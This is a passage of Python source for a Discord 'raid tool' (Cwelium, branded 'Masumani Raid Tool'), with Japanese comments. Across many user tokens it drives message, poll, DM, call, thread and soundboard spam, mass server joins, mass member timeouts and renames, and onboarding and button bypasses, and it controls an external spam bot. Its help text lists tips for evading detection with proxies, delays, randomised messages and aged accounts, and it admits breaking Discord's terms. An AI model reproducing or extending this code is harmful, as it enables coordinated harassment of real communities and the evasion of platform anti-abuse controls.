        def input_listener():
            global SHOULD_STOP
            while True:
                try:
                    cmd = sys.stdin.readline().strip()
                    if cmd and cmd.lower() == "end":
                        SHOULD_STOP = True
                        console.log("Stopping", C["red"], False, "Received stop command...")
                        break
                except:
                    break

        listener = threading.Thread(target=input_listener, daemon=True)
        listener.start()

        # スパムスレッド起動
        threads = []
        for idx, arg in enumerate(args):
            if proxy and proxies:
                # プロキシは各スレッドの get_session() 内でランダムに選択される
                pass
            t = threading.Thread(target=func, args=arg, daemon=True)
            threads.append(t)
            t.start()

        if not threads:
            console.log("Error", C["red"], False, "スレッドが起動しませんでした。トークンを確認してください。")
            SHOULD_STOP = True
            input("Press Enter to continue...")
            self.main_menu()
            return

        while any(t.is_alive() for t in threads):
            time.sleep(0.5)
            if SHOULD_STOP:
                break

        SHOULD_STOP = True
        time.sleep(0.5)
        input(f"\n   {self.background}~/> press enter to continue ")
        self.main_menu()

    # ================== メッセージファイル操作ヘルパー ==================
    def get_message_from_file_or_input(self):
        msg_dir = "data/messages"
        if not os.path.exists(msg_dir):
            os.makedirs(msg_dir)

        files = [f for f in os.listdir(msg_dir) if f.endswith('.txt')]
        if files:
            print(f"{C['cyan']}保存済みメッセージ:{C['white']}")
            for idx, fname in enumerate(files, 1):
                print(f"  {idx}: {fname}")
            print("  0: 新規入力")
            choice = input(console.prompt("選択 (番号)"))
            if choice.isdigit() and int(choice) > 0 and int(choice) <= len(files):
                selected = files[int(choice)-1]
                with open(os.path.join(msg_dir, selected), 'r', encoding='utf-8') as f:
                    msg = f.read().strip()
                console.log("Loaded", C["green"], False, f"メッセージ '{selected}' を読み込みました")
                return msg
            else:
                console.log("Info", C["yellow"], False, "新規メッセージを入力します")
        else:
            console.log("Info", C["yellow"], False, "保存済みメッセージはありません。新規入力します。")

        msg = input(console.prompt("メッセージ (空でキャンセル)"))
        if msg == "":
            return None

        save = input(console.prompt("このメッセージを保存しますか？ (y/n)"))
        if save.lower().startswith('y'):
            fname = input(console.prompt("ファイル名 (例: spam1.txt)"))
            if not fname.endswith('.txt'):
                fname += '.txt'
            with open(os.path.join(msg_dir, fname), 'w', encoding='utf-8') as f:
                f.write(msg)
            console.log("Saved", C["green"], False, f"'{fname}' に保存しました")
        return msg

    # ================== 03 Spammer（完全版） ==================
    @wrapper
    def spammer(self):
        console.title("Cwelium - Spammer")

        message = self.get_message_from_file_or_input()
        if message is None:
            self.main_menu()

        use_guild = input(console.prompt("Use Guild ID for all channels? (y/n)"))
        if use_guild.lower().startswith('y'):
            guild_id = input(console.prompt("Guild ID"))
            if not guild_id:
                self.main_menu()

            # チャンネル一覧表示（参加トークンから選択）
            console.log("Fetching channel list...", C["yellow"])
            found = False
            for token in tokens:
                try:
                    headers = self.raider.headers(token)
                    resp = session.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers)
                    if resp.status_code == 200:
                        channels = resp.json()
                        text_channels = [c for c in channels if c.get('type') == 0]
                        console.log("Found", C["green"], False, f"{len(text_channels)} text channels")
                        for ch in text_channels[:15]:
                            console.log("Channel", C["cyan"], False, f"{ch['id']} - #{ch.get('name', 'No name')}")
                        if len(text_channels) > 15:
                            console.log("Info", C["gray"], False, f"... and {len(text_channels)-15} more")
                        if not text_channels:
                            console.log("Warning", C["yellow"], False, "No text channels found in this guild.")
                        found = True
                        break
                    else:
                        console.log("Failed", C["red"], False, f"Token {token[:15]}... failed ({resp.status_code})")
                except Exception as e:
                    console.log("Error", C["red"], False, f"Token {token[:15]}... error: {e}")

            if not found:
                console.log("Failed", C["red"], "All tokens failed to fetch channels.")
                input("Press Enter to continue...")
                self.main_menu()

            # 事前メンバー取得（ランダムメンション用）
            console.log("Pre-fetching members for random mentions...", C["yellow"])
            # 適当なテキストチャンネルIDを取得して member_scrape を呼ぶ
            first_text_channel = None
            for token in tokens:
                try:
                    headers = self.raider.headers(token)
                    resp = session.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers)
                    if resp.status_code == 200:
                        channels = resp.json()
                        text_channels = [c for c in channels if c.get('type') == 0]
                        if text_channels:
                            first_text_channel = text_channels[0]['id']
                            break
                except:
                    pass
            if first_text_channel:
                self.raider.member_scrape(guild_id, first_text_channel)
            else:
                console.log("Warning", C["yellow"], False, "No text channel found, skipping member pre-fetch.")

            add_poll = input(console.prompt("投票を追加しますか？ (y/n)"))
            poll_data = None
            if add_poll.lower().startswith('y'):
                poll_data = {
                    "question": "Raid by Masumani",
                    "options": ["join", "now", "discord.gg/", "msmn"]
                }
                console.log("Poll", C["green"], False, "質問: 'Raid by Masumani', 選択肢: join, now, discord.gg/, msmn")

            pings = int(input(console.prompt("Pings amount (0推奨)")) or "0")
            delay = float(input(console.prompt("Delay between cycles (秒, 3〜5推奨)")) or "3")

            # 参加トークンのフィルタリング
            console.log("Filtering tokens in guild...", C["yellow"])
            valid_tokens = self.raider.get_valid_tokens_for_guild(guild_id)

            if not valid_tokens:
                console.log("Failed", C["red"], "対象サーバーに参加しているトークンがありません。")
                input("Press Enter to continue...")
                self.main_menu()

            console.log("Info", C["green"], False, f"{len(valid_tokens)}/{len(tokens)} 個のトークンが参加しています。")
            console.clear()
            console.render_ascii()
            args = [(token, guild_id, message, pings, delay, poll_data) for token in valid_tokens]
            self.run_spammer(self.raider.guild_spammer, args)

        else:
            # チャンネル指定モード
            link = input(console.prompt("Channel LINK"))
            if link == "" or not link.startswith("https://"):
                self.main_menu()
            guild_id = link.split("/")[4]
            channel_id = link.split("/")[5]
            massping = input(console.prompt("Massping", True))
            random_str = input(console.prompt("Random String", True))
            delay_input = input(console.prompt("Delay (seconds)"))
            delay = None
            if delay_input != "":
                delay = float(delay_input)
            ping_count = None
            if "y" in massping:
                console.log("Scraping users", self.background, False, "this may take a while...")
                self.raider.member_scrape(guild_id, channel_id)
                count_str = input(console.prompt("Pings Amount"))
                if count_str == "":
                    self.main_menu()
                ping_count = int(count_str)

            add_poll = input(console.prompt("投票を追加しますか？ (y/n)"))
            poll_data = None
            if add_poll.lower().startswith('y'):
                poll_data = {
                    "question": "Raid by Masumani",
                    "options": ["join", "now", "discord.gg/", "msmn"]
                }
                console.log("Poll", C["green"], False, "質問: 'Raid by Masumani', 選択肢: join, now, discord.gg/, msmn")

            # フィルタリング
            console.log("Filtering tokens in guild...", C["yellow"])
            valid_tokens = self.raider.get_valid_tokens_for_guild(guild_id)

            if not valid_tokens:
                console.log("Failed", C["red"], "対象サーバーに参加しているトークンがありません。")
                input("Press Enter to continue...")
                self.main_menu()

            console.log("Info", C["green"], False, f"{len(valid_tokens)}/{len(tokens)} 個のトークンが参加しています。")

            args = [
                (token, channel_id, message, guild_id, "y" in massping, ping_count, "y" in random_str, delay, poll_data)
                for token in valid_tokens
            ]
            self.run_spammer(self.raider.spammer, args)

    # ================== 06 Clear Status ==================
    @wrapper
    def clear_status(self):
        console.title("Cwelium - Clear Status")
        self.run(self.raider.clear_activity, [()])

    # ================== 13 Onliner ==================
    def onliner(self):
        console.title("Cwelium - Onliner")
        args = [(token,) for token in tokens]
        self.run(self.raider.keep_online, args)

    # ================== 25 Poll Spammer（改良版） ==================
    @wrapper
    def poll_spammer(self):
        console.title("Cwelium - Poll Spammer (Multi-Channel)")
        use_guild = input(console.prompt("Use Guild ID for all channels? (y/n)"))
        if use_guild.lower().startswith('y'):
            guild_id = input(console.prompt("Guild ID"))
            if not guild_id:
                self.main_menu()

            console.log("Fetching channel list...", C["yellow"])
            for token in tokens:
                try:
                    headers = self.raider.headers(token)
                    resp = session.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers)
                    if resp.status_code == 200:
                        channels = resp.json()
                        text_channels = [c for c in channels if c.get('type') == 0]
                        console.log("Found", C["green"], False, f"{len(text_channels)} text channels")
                        for ch in text_channels[:10]:
                            console.log("Channel", C["cyan"], False, f"{ch['id']} - #{ch.get('name', 'No name')}")
                        if len(text_channels) > 10:
                            console.log("Info", C["gray"], False, f"... and {len(text_channels)-10} more")
                        break
                except:
                    pass

            question = input(console.prompt("質問 (デフォルト: Raid by Masumani)"))
            if question == "":
                question = "Raid by Masumani"

            options_input = input(console.prompt("選択肢 (カンマ区切り, デフォルト: join,now,discord.gg/,msmn)"))
            if options_input == "":
                options = ["join", "now", "discord.gg/", "msmn"]
            else:
                options = [opt.strip() for opt in options_input.split(",") if opt.strip()]

            poll_data = {
                "question": question,
                "options": options
            }

            pings = 0
            delay = float(input(console.prompt("Delay between cycles (秒, 推奨: 3〜5)")) or "3")
            message = ""

            # フィルタリング
            valid_tokens = self.raider.get_valid_tokens_for_guild(guild_id)
            if not valid_tokens:
                console.log("Failed", C["red"], "対象サーバーに参加しているトークンがありません。")
                input("Press Enter to continue...")
                self.main_menu()

            console.clear()
            console.render_ascii()
            args = [(token, guild_id, message, pings, delay, poll_data) for token in valid_tokens]
            self.run_spammer(self.raider.guild_spammer, args)
        else:
            link = input(console.prompt("Channel LINK"))
            if link == "" or not link.startswith("https://"):
                self.main_menu()
            channel_id = link.split("/")[5]

            question = input(console.prompt("質問 (デフォルト: Raid by Masumani)"))
            if question == "":
                question = "Raid by Masumani"

            options_input = input(console.prompt("選択肢 (カンマ区切り, デフォルト: join,now,discord.gg/,msmn)"))
            if options_input == "":
                options = ["join", "now", "discord.gg/", "msmn"]
            else:
                options = [opt.strip() for opt in options_input.split(",") if opt.strip()]

            poll_data = {
                "question": question,
                "options": options
            }

            guild_id = link.split("/")[4]
            valid_tokens = self.raider.get_valid_tokens_for_guild(guild_id)
            if not valid_tokens:
                console.log("Failed", C["red"], "対象サーバーに参加しているトークンがありません。")
                input("Press Enter to continue...")
                self.main_menu()

            args = [(token, channel_id, "", None, False, None, False, None, poll_data) for token in valid_tokens]
            self.run_spammer(self.raider.spammer, args)

    # ================== 26 Mass Timeout ==================
    @wrapper
    def mass_timeout(self):
        console.title("Cwelium - Mass Timeout")
        guild_id = input(console.prompt("Guild ID"))
        if not guild_id:
            self.main_menu()
        days = int(input(console.prompt("タイムアウト日数 (1-28, デフォルト: 28)")) or "28")
        days = max(1, min(28, days))

        console.log("Info", C["yellow"], False, "権限のあるトークンを探しています...")
        valid_tokens = []
        for token in tokens:
            try:
                resp = session.get(f"https://discord.com/api/v9/guilds/{guild_id}/members/@me", headers=self.raider.headers(token))
                if resp.status_code == 200:
                    valid_tokens.append(token)
                    console.log("Token", C["green"], False, f"{token[:15]}... 有効")
                else:
                    console.log("Token", C["red"], False, f"{token[:15]}... 無効 ({resp.status_code})")
            except:
                pass

        if not valid_tokens:
            console.log("Failed", C["red"], "有効なトークンがありません。")
            input("Press Enter to continue...")
            self.main_menu()

        console.log("Info", C["yellow"], False, f"{len(valid_tokens)}個のトークンでタイムアウトを実行します")
        args = [(token, guild_id, days) for token in valid_tokens]
        self.run(self.raider.mass_timeout, args)

    # ================== 27 Mass Nick All ==================
    @wrapper
    def mass_nick_all(self):
        console.title("Cwelium - Mass Nick All")
        guild_id = input(console.prompt("Guild ID"))
        if not guild_id:
            self.main_menu()
        new_nick = input(console.prompt("新しいニックネーム"))
        if not new_nick:
            self.main_menu()

        console.log("Info", C["yellow"], False, "権限のあるトークンを探しています...")
        valid_tokens = []
        for token in tokens:
            try:
                resp = session.get(f"https://discord.com/api/v9/guilds/{guild_id}/members/@me", headers=self.raider.headers(token))
                if resp.status_code == 200:
                    valid_tokens.append(token)
                    console.log("Token", C["green"], False, f"{token[:15]}... 有効")
                else:
                    console.log("Token", C["red"], False, f"{token[:15]}... 無効 ({resp.status_code})")
            except:
                pass

        if not valid_tokens:
            console.log("Failed", C["red"], "有効なトークンがありません。")
            input("Press Enter to continue...")
            self.main_menu()

        console.log("Info", C["yellow"], False, f"{len(valid_tokens)}個のトークンでニックネーム変更を実行します")
        args = [(token, guild_id, new_nick) for token in valid_tokens]
        self.run(self.raider.mass_nick_all, args)

    # ==================== 外部ボット制御機能 ====================
    @wrapper
    def external_bot_setup(self):
        console.title("Cwelium - External Bot Setup")
        config = load_bot_config()
        api_url = input(console.prompt(f"API URL [{config.get('api_url', 'http://localhost:3001')}]")) or config.get("api_url", "http://localhost:3001")
        secret = input(console.prompt(f"API Secret [{config.get('secret', 'masumani_raid_2024')}]")) or config.get("secret", "masumani_raid_2024")
        save_bot_config({"api_url": api_url, "secret": secret})
        self.bot_controller = ExternalBotController(api_url, secret)
        console.log("Testing connection...", C["yellow"])
        status = self.bot_controller.status()
        if "error" in status:
            console.log("Failed", C["red"], False, f"Connection error: {status['error']}")
            input("Press Enter to continue...")
            return
        console.log("Success", C["green"], False, f"Connected! Guilds: {status.get('guilds', 0)} | Uptime: {status.get('uptime', 0):.0f}s")
        msg = input(console.prompt("Custom message (Enter to skip)"))
        if msg:
            res = self.bot_controller.set_message(msg)
            console.log("Set", C["green"], False, res.get("message", "OK"))
        tk = input(console.prompt("User token (for random mentions, Enter to skip)"))
        if tk:
            res = self.bot_controller.set_token(tk)
            if res.get("success"):
                config = load_bot_config()
                config["user_token"] = tk
                save_bot_config(config)
                console.log("Token", C["green"], False, "Validated and saved locally")
            else:
                console.log("Token", C["red"], False, res.get("error", "Invalid"))
        gid = input(console.prompt("Guild ID to set manual mention IDs (Enter to skip)"))
        if gid:
            ids = input(console.prompt("User IDs (comma separated)"))
            if ids:
                res = self.bot_controller.set_ids(gid, ids)
                console.log("IDs", C["green"], False, f"Set {res.get('count', 0)} users")
        console.log("Setup complete!", C["green"])
        input("Press Enter to continue...")

    @wrapper
    def external_bot_spam(self):
        console.title("Cwelium - External Bot Spam")
        if not self.bot_controller:
            config = load_bot_config()
            self.bot_controller = ExternalBotController(config.get("api_url"), config.get("secret"))
        status = self.bot_controller.status()
        if "error" in status:
            console.log("Error", C["red"], False, f"Bot offline: {status['error']}")
            console.log("Please run [29] External Bot Setup first or check if bot is running.")
            input("Press Enter to continue...")
            return
        guild_id = input(console.prompt("Guild ID (target)"))
        if not guild_id:
            return
        channel_id = input(console.prompt("Channel ID (Enter for all channels)")) or None
        count = int(input(console.prompt("Count per channel (1-20, default 5)")) or "5")
        delay = int(input(console.prompt("Delay ms (default 600)")) or "600")
        everyone = input(console.prompt("Add @everyone? (y/n)")) == "y"
        vote = input(console.prompt("Add poll? (y/n)")) == "y"
        random_count = int(input(console.prompt("Random mentions per msg (0-3, default 0)")) or "0")
        custom_msg = input(console.prompt("Custom message (Enter for default)")) or None
        user_token = None
        if random_count > 0:
            config = load_bot_config()
            user_token = config.get("user_token")
            if not user_token:
                console.log("Warning", C["yellow"], False, "No user token set. Random mentions disabled.")
                random_count = 0
        console.log("Spamming...", C["yellow"], False, "This may take a while.")
        result = self.bot_controller.spam(
            guild_id=guild_id,
            channel_id=channel_id,
            count=count,
            delay=delay,
            everyone=everyone,
            vote=vote,
            random=random_count,
            message=custom_msg,
            token=user_token
        )
        if "error" in result:
            console.log("Failed", C["red"], False, result["error"])
        else:
            console.log("Success", C["green"], False, f"{result.get('total_sent', 0)} messages sent to {result.get('channels', 0)} channels")
            if result.get("errors", 0) > 0:
                console.log("Warnings", C["yellow"], False, f"{result.get('errors')} errors occurred (check bot logs)")
        input("Press Enter to continue...")

    @wrapper
    def external_bot_status(self):
        console.title("Cwelium - External Bot Status")
        if not self.bot_controller:
            config = load_bot_config()
            self.bot_controller = ExternalBotController(config.get("api_url"), config.get("secret"))
        status = self.bot_controller.status()
        if "error" in status:
            console.log("Error", C["red"], False, f"Bot offline: {status['error']}")
        else:
            console.log("Status", C["green"], False, f"Online | Guilds: {status.get('guilds', 0)} | Uptime: {status.get('uptime', 0):.0f}s")
            console.log("API URL:", C["cyan"], False, self.bot_controller.api_url)
        input("Press Enter to continue...")

    # ================== ヘルプ機能 ==================
    def show_help(self):
        console.clear()
        console.render_ascii()
        help_text = f"""
{C['cyan']}【 Masumani Raid Tool ヘルプ 】{C['white']}

{C['green']}基本操作:{C['white']}
  メニューに表示された番号を入力して Enter で実行します。
  h または H でこのヘルプを表示します。
  ~ でクレジットを表示します。

{C['yellow']}機能一覧:{C['white']}
  {C['light_blue']}01{C['white']} Joiner          : 招待リンクからサーバーに参加（キャプチャ再試行・プロキシ対応）
  {C['light_blue']}02{C['white']} Leaver          : 指定したサーバーから退出
  {C['light_blue']}03{C['white']} Spammer         : メッセージスパム（投票・ランダムメンション・永久ループ）
  {C['light_blue']}04{C['white']} Token Checker   : トークンの有効性をチェック
  {C['light_blue']}05{C['white']} Emoji Reaction  : メッセージにリアクション
  {C['light_blue']}06{C['white']} Clear Status    : ゲームステータスとカスタムステータスを消去
  {C['light_blue']}07{C['white']} Token Formatter : トークンを整形
  {C['light_blue']}08{C['white']} Button Click    : メッセージのボタンをクリック
  {C['light_blue']}09{C['white']} Accept Rules    : サーバーのルールを承認
  {C['light_blue']}10{C['white']} Guild Check     : サーバー参加チェック
  {C['light_blue']}11{C['white']} Friend Spam     : フレンドリクエスト
  {C['light_blue']}13{C['white']} Onliner         : オンライン維持（WebSocket接続）
  {C['light_blue']}14{C['white']} Voice Raper     : サウンドボードスパム
  {C['light_blue']}15{C['white']} Change Nick     : 自分のニックネーム変更
  {C['light_blue']}16{C['white']} Thread Spammer  : スレッド大量作成
  {C['light_blue']}17{C['white']} Typer           : 入力中偽装
  {C['light_blue']}19{C['white']} Call Spammer    : 通話スパム
  {C['light_blue']}20{C['white']} Bio Change      : バイオ変更
  {C['light_blue']}21{C['white']} Voice Joiner    : ボイスチャンネル参加
  {C['light_blue']}22{C['white']} Onboard Bypass  : オンボーディング回避
  {C['light_blue']}23{C['white']} DM Spammer      : DMスパム
  {C['light_blue']}25{C['white']} Poll Spammer    : 投票スパム（Guild ID指定で複数チャンネル対応）
  {C['light_blue']}26{C['white']} Mass Timeout    : 全員タイムアウト（最大28日）
  {C['light_blue']}27{C['white']} Mass Nick All   : 全員ニックネーム一括変更
  {C['light_blue']}29{C['white']} Ext Bot Setup   : 外部ボット設定
  {C['light_blue']}30{C['white']} Ext Bot Spam    : 外部ボットスパム
  {C['light_blue']}31{C['white']} Ext Bot Status  : 外部ボット状態
  {C['light_blue']}24{C['white']} Exit            : 終了

{C['yellow']}【 引っかからないためのコツ 】{C['white']}
  1. {C['green']}プロキシを使用する{Fore.RESET}: config.json で Proxies: true
  2. {C['green']}遅延を調整する{Fore.RESET}: スパマー 3〜5秒、ジョイナー 0.5〜3秒
  3. {C['green']}@everyone を避ける{Fore.RESET}: レート制限の原因
  4. {C['green']}メッセージをバリエーション化{Fore.RESET}: ランダム文字列追加
  5. {C['green']}参加間隔を空ける{Fore.RESET}: トークンごとに1〜3秒
  6. {C['green']}キャプチャ対策{Fore.RESET}: 自動再試行（最大2回）
  7. {C['green']}アカウントの品質{Fore.RESET}: 古いアカウントほど制限緩い

{C['red']}注意:{C['white']}
  - 自己ボット（ユーザートークン）を使用。Discord利用規約に違反します。
  - 過度な使用はアカウント停止のリスクがあります。
        """
        print(help_text)
        input(f"\n   {self.background}~/> press enter to continue ")
        self.main_menu()

    # ---------- 以下、既存のラッパー（変更なし） ----------
    @wrapper
    def dm_spam(self):
        console.title("Cwelium - Dm Spammer")
        user_id = input(console.prompt("User ID"))
        if user_id == "":
            self.main_menu()
        message = input(console.prompt("Message"))
        if message == "":
            self.main_menu()
        console.clear()
        console.render_ascii()
        args = [(token, user_id, message) for token in tokens]
        self.run(self.raider.dm_spammer, args)

    @wrapper
    def soundbord(self):
        console.title("Cwelium - Soundboard Spam")
        Link = input(console.prompt("Channel LINK"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()
        channel = Link.split("/")[5]
        guild = Link.split("/")[4]
        console.clear()
        console.render_ascii()
        for token in tokens:
            threading.Thread(target=self.raider.join_voice_channel, args=(token, guild, channel)).start()
            threading.Thread(target=self.raider.soundbord, args=(token, channel)).start()

    @wrapper
    def friender(self):
        console.title("Cwelium - Friender")
        nickname = input(console.prompt("Nick"))
        if nickname == "":
            self.main_menu()
        args = [(token, nickname) for token in tokens]
        self.run(self.raider.friender, args)

    @wrapper
    def caller(self):
        console.title("Cwelium - Call Spammer")
        user_id = input(console.prompt("User ID"))
        if user_id == "":
            self.main_menu()
        console.clear()
        console.render_ascii()
        args = [(token, user_id) for token in tokens]
        self.run(self.raider.call_spammer, args)

    @wrapper
    def typier(self):
        console.title("Cwelium - Typer")
        Link = input(console.prompt("Channel LINK"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()
        channelid = Link.split("/")[5]
        args = [(token, channelid) for token in tokens]
        self.run(self.raider.typier, args)

    @wrapper
    def nick_changer(self):
        console.title("Cwelium - Nickname Changer")
        nick = input(console.prompt("Nick"))
        if nick == "" or len(nick) > 32:
            self.main_menu()
        guild = input(console.prompt("Guild ID"))
        if guild == "":
            self.main_menu()
        args = [(token, guild, nick) for token in tokens]
        self.run(self.raider.mass_nick, args)

    @wrapper
    def voice_joiner(self):
        console.title("Cwelium - Voice Joiner")
        Link = input(console.prompt("Channel LINK"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()
        guild = Link.split("/")[4]
        channel = Link.split("/")[5]
        args = [(token, guild, channel) for token in tokens]
        self.run(self.raider.join_voice_channel, args)

    @wrapper
    def Thread_Spammer(self):
        console.title("Cwelium - Thread Spammer")
        Link = input(console.prompt("Channel LINK"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()
        name = input(console.prompt("Name"))
        if name == "":
            self.main_menu()
        channel_id = Link.split("/")[5]
        args = [(token, channel_id, name) for token in tokens]
        self.run(self.raider.thread_spammer, args)

    @wrapper
    def joiner(self):
        console.title("Cwelium - Joiner")
        invite = input(console.prompt("Invite"))
        if invite == "":
            self.main_menu()
        invite = re.sub(r"(https?://)?(www\.)?(discord\.(gg|com)/(invite/)?|\.gg/)", "", invite)
        self.raider.joiner(invite)

    @wrapper
    def leaver(self):
        console.title("Cwelium - Leaver")
        guild = input(console.prompt("Guild ID"))
        if guild == "":
            self.main_menu()
        args = [(token, guild) for token in tokens]
        self.run(self.raider.leaver, args)

    def checker(self):
        console.title("Cwelium - Checker")
        self.raider.token_checker()

    @wrapper
    def reactor(self):
        console.title("Cwelium - Reactor")
        Link = input(console.prompt("Message Link"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()
        channel_id = Link.split("/")[5]
        message_id = Link.split("/")[6]
        console.clear()
        console.render_ascii()
        self.raider.reactor_main(channel_id, message_id)

    def button(self):
        console.title("Cwelium - Button Click")
        Link = input(console.prompt("Message Link"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()
            return
        guild_id = Link.split("/")[4]
        channel_id = Link.split("/")[5]
        message_id = Link.split("/")[6]
        console.clear()
        console.render_ascii()
        self.raider.button_bypass(channel_id, message_id, guild_id)

    def formatter(self):
        console.title("Cwelium - Formatter")
        self.run(self.raider.format_tokens, [()])

    @wrapper
    def accept(self):
        console.title("Cwelium - Accept Rules")
        guild_id = input(console.prompt("Guild ID"))
        if guild_id == "":
            self.main_menu()
        console.clear()
        console.render_ascii()
        self.raider.accept_rules(guild_id)

    @wrapper
    def guild(self):
        console.title("Cwelium - Guild Checker")
        guild_id = input(console.prompt("Guild ID"))
        if guild_id == "":
            self.main_menu()
        console.clear()
        console.render_ascii()
        self.raider.guild_checker(guild_id)

    @wrapper
    def bio_changer(self):
        console.title("Cwelium - Bio Changer")
        bio = input(console.prompt("Bio"))
        if bio == "":
            self.main_menu()
        args = [(token, bio) for token in tokens]
        self.run(self.raider.bio_changer, args)

    @wrapper
    def onboard(self):
        console.title("Cwelium - Onboarding Bypass")
        guild_id = input(console.prompt("Guild ID"))
        if guild_id == "":
            self.main_menu()
        console.clear()
        console.render_ascii()
        self.raider.onboard_bypass(guild_id)

    @wrapper
    def credit(self):
        credits_lines = [
            "Special Thanks to",
            "Coder: Tips",
            "Scraper: Aniell4",
            "Original Owner of Helium/Cwelium: Ekkore",
            "And last but not least, you! Without you, this project wouldn't be possible.",
        ]
        for line in credits_lines:
            centered_line = line.center(os.get_terminal_size().columns)
            print(f"{Fore.RESET}{self.background}{centered_line}{Fore.RESET}")
        input("\n ~/> press enter to continue ")
        self.main_menu()

    @wrapper
    def exits(self):
        choice = input(console.prompt("Are you sure you want to quit", ask=True))
        if choice.lower().startswith("y"):
            os._exit(0)
        else:
            self.main_menu()


if __name__ == "__main__":
    Menu().main_menu()
